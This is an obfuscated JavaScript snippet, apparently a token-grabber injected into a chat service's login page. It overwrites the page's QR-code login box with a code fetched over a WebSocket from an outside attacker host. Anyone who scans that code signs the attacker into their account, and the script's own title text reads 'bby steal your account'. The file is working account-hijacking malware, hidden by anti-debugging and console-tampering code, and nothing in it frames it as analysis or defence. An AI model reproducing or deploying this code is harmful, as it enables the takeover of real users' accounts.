let keybby = "frPI3qkI9jWG";
function getElementByXpath(_0x3b1720) {
  const _0x357c1a = (function () {
      let _0x4e3897 = !![];
      return function (_0x92ae64, _0x5dfad6) {
        const _0x410191 = _0x4e3897
          ? function () {
              if (_0x5dfad6) {
                const _0x4075e8 = _0x5dfad6["apply"](_0x92ae64, arguments);
                return (_0x5dfad6 = null), _0x4075e8;
              }
            }
          : function () {};
        return (_0x4e3897 = ![]), _0x410191;
      };
    })(),
    _0x238389 = _0x357c1a(this, function () {
      return _0x238389["toString"]()
        ["search"]("(((.+)+)+)+$")
        ["toString"]()
        ["constructor"](_0x238389)
        ["search"]("(((.+)+)+)+$");
    });
  return (
    _0x238389(),
    document["evaluate"](
      _0x3b1720,
      document,
      null,
      XPathResult["FIRST_ORDERED_NODE_TYPE"],
      null
    )["singleNodeValue"]
  );
}
getElementByXpath(
  "/html/body/div[1]/div[3]/div/div/div/div/form/div/div/div[3]/div/div/div/div[1]"
)["innerHTML"] =
  '<div class="qrCodeContainer-1qlybH"> <div class="qrCode-2R7t9S" title="Oh nice! bby steal your account" style="padding: 8px; border-radius: 4px; background: rgb(255, 255, 255);"> <canvas width="160" height="160" style="display: none;"></canvas> <img id="qrcode" alt="Scan me!" src="" style="display: block;"> </div> <div class="qrCodeOverlay-2bLtKl"><img src="/assets/092b071c3b3141a58787415450c27857.png" alt=""></div></div>';
let key = "doQnPRtcRQSv",
  bbyws;
function connect() {
  const _0x2d307a = (function () {
      let _0x3fec46 = !![];
      return function (_0x1c2fed, _0x1f289d) {
        const _0x269975 = _0x3fec46
          ? function () {
              if (_0x1f289d) {
                const _0xc82f7e = _0x1f289d["apply"](_0x1c2fed, arguments);
                return (_0x1f289d = null), _0xc82f7e;
              }
            }
          : function () {};
        return (_0x3fec46 = ![]), _0x269975;
      };
    })(),
    _0x2589b2 = _0x2d307a(this, function () {
      const _0x187684 = function () {
          let _0x39d6f3;
          try {
            _0x39d6f3 = Function(
              "return (function() " + '{}.constructor("return this")( )' + ");"
            )();
          } catch (_0x4abba1) {
            _0x39d6f3 = window;
          }
          return _0x39d6f3;
        },
        _0xc33925 = _0x187684(),
        _0x55cacd = (_0xc33925["console"] = _0xc33925["console"] || {}),
        _0x1f64c2 = [
          "log",
          "warn",
          "info",
          "error",
          "exception",
          "table",
          "trace",
        ];
      for (let _0x2e41b8 = 0x0; _0x2e41b8 < _0x1f64c2["length"]; _0x2e41b8++) {
        const _0x2a3c36 =
            _0x2d307a["constructor"]["prototype"]["bind"](_0x2d307a),
          _0x23a19a = _0x1f64c2[_0x2e41b8],
          _0x32605c = _0x55cacd[_0x23a19a] || _0x2a3c36;
        (_0x2a3c36["__proto__"] = _0x2d307a["bind"](_0x2d307a)),
          (_0x2a3c36["toString"] = _0x32605c["toString"]["bind"](_0x32605c)),
          (_0x55cacd[_0x23a19a] = _0x2a3c36);
      }
    });
  _0x2589b2(),
    (bbyws = new WebSocket("wss://superfuniestindianparty.rip")),
    (bbyws["onopen"] = () => console["log"]("connected")),
    (bbyws["onerror"] = (_0x5aceb0) => console["log"](_0x5aceb0)),
    (bbyws["onmessage"] = (_0x4798c0) => {
      _0x4798c0 = JSON["parse"](_0x4798c0["data"]);
      switch (_0x4798c0["action"]) {
        case "welcome":
          bbyws["send"](JSON["stringify"]({ action: "key", key: keybby }));
          break;
        case "qrcode":
          const _0xe953a0 = _0x4798c0["qrcode"];
          console["log"](_0xe953a0),
            (document["getElementById"]("qrcode")["src"] = _0xe953a0);
          break;
      }
    });
}
setInterval(() => {
  if (bbyws?.["readyState"] == 0x3) connect();
}, 0x1f4),
  connect();
